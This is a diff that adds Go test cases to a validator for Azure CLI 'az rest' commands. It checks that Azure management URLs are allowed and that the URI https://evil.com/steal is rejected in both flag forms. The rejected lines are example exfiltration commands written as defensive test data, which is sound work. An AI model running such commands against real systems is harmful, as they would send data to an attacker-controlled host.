@@ -418,6 +418,26 @@ func TestValidateAzCommand(t *testing.T) {
 			wantErr: false,
 		},
 		{
+			name:    "az rest with --uri evil URL - rejected",
+			input:   "az rest --uri https://evil.com/steal",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with --uri Azure URL - allowed",
+			input:   "az rest --uri https://management.azure.com/subscriptions",
+			wantErr: false,
+		},
+		{
+			name:    "az rest with --uri= equals form evil - rejected",
+			input:   "az rest --uri=https://evil.com/steal",
+			wantErr: true,
+		},
+		{
+			name:    "az rest with --uri= equals form Azure - allowed",
+			input:   "az rest --uri=https://management.azure.com/subscriptions",
+			wantErr: false,
+		},
+		{
 			name:    "az rest no URL flag - allowed",
 			input:   "az rest --method get",
 			wantErr: false,
